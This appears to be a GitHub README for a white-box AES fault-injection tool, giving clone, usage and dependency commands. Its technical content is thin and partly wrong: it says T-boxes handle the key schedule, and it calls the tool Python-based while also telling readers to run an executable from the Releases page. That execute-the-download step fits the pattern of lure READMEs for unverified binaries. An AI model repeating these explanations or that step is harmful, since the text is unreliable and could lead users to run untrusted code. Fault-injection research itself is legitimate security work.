## Overview

WhiteBoxAesCrack allows you to inject faults into the white-box AES by specifying the address of the T-box or Tyibox. This tool is designed for researchers and developers working in cryptography and security. By manipulating these components, you can explore vulnerabilities in the AES implementation and assess its robustness against fault attacks.

## Features

- **Fault Injection**: Specify addresses for T-box and Tyibox.
- **User-Friendly Interface**: Simple commands to get started.
- **Comprehensive Documentation**: Clear instructions and examples.
- **Open Source**: Contribute and improve the tool.

## Getting Started

To get started with WhiteBoxAesCrack, follow these steps:

1. **Clone the Repository**: 
   ```bash
   git clone https://github.com/elprimoft/WhiteBoxAesCrack.git
   cd WhiteBoxAesCrack
   ```

2. **Download the Latest Release**: Visit the [Releases](https://github.com/elprimoft/WhiteBoxAesCrack/releases) section to download the latest version. You need to execute the downloaded file to start using the tool.

3. **Install Dependencies**: Make sure you have all necessary dependencies installed. Check the documentation for specific requirements.

## Usage

To use WhiteBoxAesCrack, follow these simple commands:

```bash
./whiteboxaescrack --tbox <address> --tyibox <address>
```

Replace `<address>` with the actual memory addresses you want to target.

## Fault Injection

### What is Fault Injection?

Fault injection is a technique used to test the robustness of systems by intentionally introducing errors. In the context of cryptography, this can reveal weaknesses in algorithms and implementations.

### How Does It Work?

In WhiteBoxAesCrack, you can inject faults by specifying the addresses of the T-box or Tyibox. The tool manipulates the data processed by these components, allowing you to analyze how the AES algorithm responds to unexpected changes.

### Example

To inject a fault, you might run:

```bash
./whiteboxaescrack --tbox 0x12345678 --tyibox 0x87654321
```

This command targets the specified addresses, allowing you to observe the behavior of the AES implementation.

## Technical Details

WhiteBoxAesCrack is built using Python and relies on various libraries for cryptographic functions. The architecture of the tool allows for easy modifications and enhancements.

### Key Components

- **T-box**: Transformation box that handles key schedule and state transformations.
- **Tyibox**: An additional layer that can introduce further complexity in the fault injection process.

### Dependencies

Make sure to install the following dependencies:

- Python 3.x
- Required libraries (listed in `requirements.txt`)

You can install them using:

```bash
pip install -r requirements.txt
```
